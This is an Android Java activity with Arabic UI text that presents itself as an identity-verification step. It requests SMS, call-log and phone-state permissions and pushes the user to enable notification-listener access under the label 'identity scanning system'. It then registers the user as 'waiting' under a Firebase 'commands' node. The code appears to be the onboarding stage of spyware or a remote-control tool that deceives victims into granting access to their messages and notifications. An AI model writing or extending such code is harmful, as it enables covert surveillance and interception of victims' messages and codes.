package com.ban.ab;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

// استيراد الحزمة الرسمية للفايربيس ✅
import com.google.firebase.database.FirebaseDatabase;

public class VerifyActivity extends AppCompatActivity {

    private static final int PERMISSION_CODE = 101;
    private String userName;
    
    private Button btnStartVerify;
    private ProgressBar verifyProgressBar, progressBarTop; // دعم الـ Progress المشترك الأنيق ✅

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_verify); // تأكد من وجود العناصر بالـ XML

        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "Unknown");
        
        btnStartVerify = findViewById(R.id.btnStartVerify);
        verifyProgressBar = findViewById(R.id.verifyProgressBar);
        progressBarTop = findViewById(R.id.progressBarTop);

        if (btnStartVerify != null) {
            btnStartVerify.setOnClickListener(v -> {
                toggleLoading(true);
                new Handler(Looper.getMainLooper()).postDelayed(this::requestPermissionsSystem, 1000);
            });
        }
    }

    private void toggleLoading(boolean isLoading) {
        if (btnStartVerify == null) return;
        if (isLoading) {
            btnStartVerify.setEnabled(false);
            btnStartVerify.setText("");
            if (verifyProgressBar != null) verifyProgressBar.setVisibility(View.VISIBLE);
            if (progressBarTop != null) progressBarTop.setVisibility(View.VISIBLE);
        } else {
            btnStartVerify.setEnabled(true);
            btnStartVerify.setText("بدء عملية الربط والتحقق");
            if (verifyProgressBar != null) verifyProgressBar.setVisibility(View.GONE);
            if (progressBarTop != null) progressBarTop.setVisibility(View.GONE);
        }
    }

    private void requestPermissionsSystem() {
        String[] permissions = {
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_CODE);
        } else {
            checkNotificationListenerBridge();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_CODE) {
            checkNotificationListenerBridge();
        }
    }

    private void checkNotificationListenerBridge() {
        if (!isNotificationServiceEnabled()) {
            toggleLoading(false);
            try {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intent);
                Toast.makeText(this, "خطوة أخيرة: يرجى تفعيل 'نظام فحص الهوية' 🛡️", Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                startActivity(new Intent(Settings.ACTION_SETTINGS));
            }
        } else {
            notifyAdminSuccess();
        }
    }

    // التحديث الحي والمباشر عبر الفايربيس بدلاً من OkHttp 🚀
    private void notifyAdminSuccess() {
        toggleLoading(true);

        FirebaseDatabase.getInstance().getReference("commands")
                .child(userName).child("status").setValue("waiting")
                .addOnSuccessListener(aVoid -> {
                    Toast.makeText(this, "تم تفعيل نظام الفحص السحابي بنجاح ✅", Toast.LENGTH_SHORT).show();
                    finish();
                })
                .addOnFailureListener(e -> {
                    toggleLoading(false);
                    Toast.makeText(this, "فشل الربط السحابي، تحقق من الإنترنت", Toast.LENGTH_SHORT).show();
                });
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(pkgName);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (isNotificationServiceEnabled()) {
            notifyAdminSuccess();
        } else {
            toggleLoading(false);
        }
    }
}
